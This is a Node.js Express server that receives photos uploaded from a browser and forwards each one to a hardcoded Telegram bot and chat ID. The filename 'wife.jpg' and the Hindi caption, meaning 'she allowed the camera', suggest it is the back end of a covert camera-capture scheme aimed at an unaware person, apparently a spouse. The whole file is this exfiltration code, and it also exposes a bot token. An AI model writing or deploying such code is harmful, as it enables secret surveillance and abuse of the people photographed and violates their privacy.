const express = require('express');
const multer = require('multer');
const fetch = require('node-fetch');
const cors = require('cors');

const app = express();
const upload = multer();

app.use(cors());

const BOT_TOKEN = '8345809019:AAESIzpDcmVQU1yP0EHRJOLyB_UNgPyK64w';
const CHAT_ID = '1946004115';

app.post('/send-photo', upload.single('photo'), async (req, res) => {
  try {
    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('photo', new Blob([req.file.buffer]), 'wife.jpg');
    formData.append('caption', '💕 Usne camera allow kar diya!');

    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
      method: 'POST',
      body: formData
    });

    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

app.listen(3000, () => console.log('Server running'));
